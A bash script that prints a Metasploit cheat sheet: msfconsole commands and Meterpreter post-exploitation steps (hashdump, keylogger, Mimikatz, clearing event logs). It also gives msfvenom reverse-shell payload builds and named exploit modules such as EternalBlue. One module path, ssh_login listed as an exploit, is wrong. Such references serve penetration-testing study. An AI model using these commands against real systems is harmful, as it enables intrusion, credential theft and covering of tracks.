#!/usr/bin/env bash
# ==============================================================================
# METASPLOIT QUICK COMMAND REFERENCE — All msfconsole commands at a glance
# Usage: bash msf-commands.sh
# ==============================================================================

cat << 'REFERENCE'

══════════════════════════════════════════════════════════════════════════════
                    METASPLOIT QUICK COMMAND REFERENCE
══════════════════════════════════════════════════════════════════════════════

╔════════════════════════════════════════════════════════════════════════════╗
║  CORE COMMANDS                                                              ║
╠════════════════════════════════════════════════════════════════════════════╣
║  ? / help          → Help menu                                            ║
║  search <term>     → Find modules (e.g., search scanner/smb)              ║
║  use <module>      → Select module                                        ║
║  show options      → Show module parameters                               ║
║  set <OPT> <val>   → Set parameter                                        ║
║  setg <OPT> <val>  → Set global parameter                                 ║
║  run / exploit     → Execute module                                       ║
║  sessions -l       → List active sessions                                 ║
║  sessions -i <N>   → Interact with session N                              ║
║  back              → Return from module/context                           ║
╚════════════════════════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════════════════════════╗
║  DATABASE COMMANDS                                                          ║
╠════════════════════════════════════════════════════════════════════════════╣
║  db_status                     → Check DB connection                      ║
║  workspace -a <name>           → Create workspace                         ║
║  workspace <name>              → Switch workspace                         ║
║  db_nmap -sS -T4 <target>      → Nmap scan → auto-import                  ║
║  db_import <file.xml>          → Import scan results                      ║
║  hosts                         → List discovered hosts                    ║
║  services                      → List discovered services                 ║
║  vulns                         → List vulnerabilities                     ║
║  loot                          → List collected loot                      ║
╚════════════════════════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════════════════════════╗
║  SESSION MANAGEMENT                                                        ║
╠════════════════════════════════════════════════════════════════════════════╣
║  sessions -l                   → List all sessions                        ║
║  sessions -i <N>               → Interact with session N                  ║
║  sessions -k <N>               → Kill session N                           ║
║  background / bg               → Background current session               ║
╚════════════════════════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════════════════════════╗
║  METERPRETER COMMANDS                                                       ║
╠════════════════════════════════════════════════════════════════════════════╣
║  sysinfo                       → OS, hostname, arch                       ║
║  getuid                        → Current user                             ║
║  getsystem                     → Priv esc (SYSTEM)                        ║
║  hashdump                      → Dump SAM/NTLM hashes                     ║
║  ps                            → Process list                             ║
║  migrate <PID>                 → Move to process                          ║
║  shell                         → Drop to cmd.exe / /bin/sh               ║
║  upload <src> <dst>            → Upload file                              ║
║  download <src> <dst>          → Download file                            ║
║  portfwd add -L <lp> -p <rp>   → Port forward                             ║
║  route add <subnet>            → Pivot routes                             ║
║  screenshot                    → Capture desktop                          ║
║  keyscan_start / keyscan_dump   → Keylogger                                ║
║  load kiwi                     → Load Mimikatz                            ║
║  clearev                       → Clear event logs                         ║
╚════════════════════════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════════════════════════╗
║  PAYLOAD GENERATION (msfvenom)                                              ║
╠════════════════════════════════════════════════════════════════════════════╣
║  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444    ║
║           -f exe -o payload.exe                                           ║
║                                                                            ║
║  msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443   ║
║           -f exe -o payload_https.exe                                     ║
║                                                                            ║
║  msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444      ║
║           -f elf -o payload.elf                                           ║
║                                                                            ║
║  msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444        ║
║           -o payload.apk                                                  ║
║                                                                            ║
║  msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444            ║
║           -f raw -o shell.php                                             ║
╚════════════════════════════════════════════════════════════════════════════╝

╔════════════════════════════════════════════════════════════════════════════╗
║  KEY EXPLOITS (quick access)                                                ║
╠════════════════════════════════════════════════════════════════════════════╣
║  exploit/windows/smb/ms17_010_eternalblue        # EternalBlue            ║
║  exploit/windows/rdp/cve_2019_0708_bluekeep_rce   # BlueKeep              ║
║  exploit/windows/smb/ms08_067_netapi               # MS08-067              ║
║  exploit/windows/smb/psexec                        # PsExec (authenticated)║
║  exploit/linux/ssh/ssh_login                       # SSH brute             ║
║  exploit/multi/http/php_cgi_arg_injection          # PHP CGI               ║
║  exploit/multi/handler                             # Reverse shell handler ║
╚════════════════════════════════════════════════════════════════════════════╝

══════════════════════════════════════════════════════════════════════════════
                    END OF REFERENCE
══════════════════════════════════════════════════════════════════════════════

REFERENCE